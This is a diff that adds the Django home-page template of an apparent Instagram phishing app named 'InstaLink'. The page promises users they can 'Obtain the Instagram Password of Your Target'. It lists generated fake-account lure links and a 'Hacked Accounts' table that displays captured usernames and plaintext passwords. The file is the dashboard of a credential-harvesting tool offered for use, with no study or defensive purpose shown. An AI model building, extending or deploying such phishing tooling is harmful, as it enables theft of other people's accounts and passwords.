@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Home Page</title>
+    {% load static %}
+
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.css">
+    <link type="text/css" rel="stylesheet" href="{% static 'styleindex1.css' %}">
+    <link type="text/css" rel="stylesheet" href="{% static 'homeStyle.css' %}">
+    <script src="{% static 'typed.js' %}" type="text/javascript"></script>
+    <script src="{% static 'jquery.js' %}" type="text/javascript"></script>
+    <script type="text/javascript" src="{% static 'animate1.js' %}"></script>
+    </head>
+<body>
+    <div class="header">
+        <h2 class="title">Insta<i class="fa fa-theater-masks"></i>Link</h2>
+        <div class="typedDiv"><p class="typed"></p></div>
+    
+    </div>
+
+{% if messages %}
+    <div class="notify">
+        <div class="area">
+            {% for msg in messages %}
+            <p class="msg">{{msg}}</p>
+            {% endfor %}
+            <button class="ok">OK</button>
+        </div>
+    </div>
+{% endif %}
+    <!-- content block goes here -->
+
+    <div class="mainBlock">
+        <div class="inside"><p><span class="h">Hi</span> <span>{{user}}</span>, in this website You can easily Obtain the Instagram Password of &nbsp Your Target. Just click On the STEPS to follow the steps.</p></div>
+       <a href="create"><button class="steps">STEPS</button></a>
+    </div>
+    <div class="dummyAccount">
+        <!--if dummy Accounts-->
+        <table>
+            <caption class="thead">Fake Accounts</caption>
+            {% if accounts %}
+            {% for account in accounts %}
+            <tr>
+                <td><button class="copy"><i class="fa fa-clone"></i></button></td>
+                <td class="link">http://127.0.0.1:8000/instagram/accounts/{{account.id}}/{{account.name}}/{{account.uid.id}}</td>
+                <td><a href="{% url 'delete' id=account.id %}"><button class="delete"><i class="fa fa-trash-alt"></i></button></a></td>
+            </tr>
+            {% endfor %}
+            {% else %}
+            <tr class="notFound">
+                <td>Currently No accounts</td>
+                <td class="add"><a href="create"><button><i class="fa fa-plus"></i> Create</button></a></td>
+            </tr>
+            {% endif %}
+        </table>
+    </div>
+    {% csrf_token %}
+    <!-- end of content block-->
+    <div class="results">
+     <!--if dummy Accounts-->
+        <table>
+           <caption class="thead">Hacked Accounts</caption>
+
+            {% if hacked %}
+
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+            </tr>
+            {% for account in hacked %}
+            <tr>
+                <td class="uername">{{account.username}}</td>
+                <td class="password">{{account.password}}</td>
+            </tr>
+            {% endfor %}
+            {% else %}
+             <tr>
+                <td>Currently no accounts Hacked By You, click On above STEPS Button to follow the steps</td>
+            </tr>
+           {% endif %}
+        </table>
+    </div>
+    
+    
+    </div>
+    <footer>
+    <div class="fhead">Thank You</div>
+    <div class="fmain">
+        <div class="about">
+            <p>Designed and developed By <span class="name">Prasad Poojary</span>
+            </p>
+            <p></p>
+        </div>
+        <div class="contact">
+            <ul>
+                <li><a href="https://www.instagram.com/_w.e.b__w.a.r.r.i.o.r_/"><i class="fab fa-instagram"></i>Instagram</a></li>
+                <li><a href="mailto: prasadpoojary815@gmail.com"><i class="fab fa-google"></i>E-mail</a></li>
+                <li><a href="https://github.com/Prasad815"><i class="fab fa-github"></i>github</a></li>
+                <li><a href="https://www.linkedin.com/in/prasad-poojary-247665193/"><i class="fab fa-linkedin"></i>Linkedin</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="copyright">
+        <i class="fa fa-copyright"></i> Copyright 2020-2023. All Rights Reserved.
+    </div>
+        
+    </footer>
+    <nav>
+        <ul class="navv">
+            <li class="home">
+                <a href="homepage"><i class="fa fa-home"></i>
+                <span>Home</span></a>
+            </li>
+            <li>
+                <a href="create"><i class="fa fa-plus"></i>
+                <span>Create</span></a>
+            </li>
+            <li>
+                <a href="profile"><i class="fa fa-user"></i>
+                <span>Profile</span></a>
+            <li>
+                <a href="feedback"><i class="fa fa-comments"></i>
+                <span>Feedback</span></a>
+            <li>
+                <a href="logout"><i class="fa fa-sign-out-alt"></i>
+                <span>Logout</span></a>
+            </li>
+        </ul>
+    </nav>
+</body>
+</html>
